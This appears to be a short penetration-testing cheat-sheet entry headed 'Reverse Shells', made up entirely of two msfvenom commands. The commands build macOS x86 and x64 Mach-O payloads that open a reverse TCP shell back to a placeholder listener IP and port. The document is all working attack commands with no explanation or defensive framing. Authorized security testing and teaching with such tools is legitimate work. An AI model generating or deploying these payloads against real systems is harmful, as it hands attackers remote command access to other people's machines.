# Reverse Shells

```
$ msfvenom -p osx/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x86

$ msfvenom -p osx/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x64
```